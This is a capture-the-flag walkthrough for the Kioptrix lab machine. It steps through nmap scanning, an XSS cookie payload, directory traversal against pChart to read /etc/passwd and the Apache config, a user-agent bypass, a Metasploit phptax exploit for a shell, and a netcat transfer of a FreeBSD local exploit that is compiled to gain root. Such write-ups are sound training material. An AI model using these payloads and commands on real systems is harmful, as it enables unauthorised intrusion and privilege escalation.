## Find IP of box
Our IP: x.x.x.49

`nmap -sP <LHOST>/24`

Kioptrix is running x.x.x.16

## Init NMap Scan

`nmap -sC -sV -oA nmap x.x.x.16`

 - Default Scripts
 - Service Detection
 - Output all formats

 There are 3 ports open: 22 (ssh), 80 (http), 8080 (http)
 
 However, the ssh port is closed so we cannot connect
  
## HTTP
 
 If we check the source code of port 80, the meta tag has been left in and gives us a url path: `pChart2.1.3/index.php`
 
### Searchsploit
 
 `searchsploit pchart 2.1.3` and we get a txt file containing explanations of multiple explanations such as directory traversal and XSS
 ### XSS

`/pChart2.1.3/examples/sandbox/script/session.php?id=<script>alert(document.cookie)</script>`
 
### Directory Traversal
 
Append `?Action=View&Script=/../../etc/passwd` to the url (after index.php) to view etc/passwd but no hashes to be cracked

We can use to view apache config files located in `/usr/local/etc/apache22/httpd.conf`

Looking through this, we can see that the web server on port 8080 must use the Mozilla/4.0 user agent

`SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser`
`<VirtualHost *:8080>`

We can do this by capturing the request in Burp Suite and changing the 5.0 to 4.0 in the user agent 

If we follow the phptax link, we find some tax forms containing sensitive information.

It seems there'll be a lot of clicking and to continuously keep changing the user agent in burp suite is tedious. I'm going to change it in firefox.

go to `about:config`, right click and select new > string. Call it `general.useragent.override` and enter in the value `Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0`

Now we can navigate normally.

## MSFConsole

If we search on msfconsole for 'phptax', there's an exploit we can use

`set rhost x.x.x.16`
`set rport 8080`
`run`

To upgrade our shell, we can run `/bin/sh -i`

To get system info, we can type `uname -a` and we know our OS is FreeBSD 9.0

`searchsploit freebsd 9.0` on our local machine and we get a couple of local exploits, however, this means we must transfer the exploit onto the victim machine.

The system doesn't have `wget`, my usual method of transfer but we are able to run `nc`

Our machine: `nc -lvnp 4444 < 26368.c`

Victim machine: `nc x.x.x.49 4444 > exploit.c`

When it connects, end the connection on our end and run `gcc -o exploit exploit.c` on the victim

`chmod 777 exploit`

`./exploit` We become root and we can read the congrats.txt in /root
